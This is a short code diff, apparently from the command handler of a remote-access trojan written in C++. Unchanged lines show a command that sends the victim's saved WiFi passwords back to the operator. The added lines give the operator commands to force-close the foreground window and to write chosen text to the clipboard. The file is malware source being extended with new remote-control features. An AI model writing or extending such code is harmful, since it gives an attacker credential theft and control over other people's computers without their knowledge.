@@ -269,6 +269,16 @@ void commands(string command, string parameters) {
 		Send(get_ListOfWifiPasswords());
 		done = false;
 	}
+	else if (command == "CloseForeground") {
+		if (parameters == "true") {
+			StartStopClosingForeground(true);
+		}
+		else StartStopClosingForeground(false);
+	}
+	else if (command == "WriteToClipboard") {
+		HWND hwnd = GetDesktopWindow();
+		toClipboard(hwnd,parameters);
+	}
 	else {
 		Send("Command not found, use <ID> help to check list of all commands");
 		done = false;
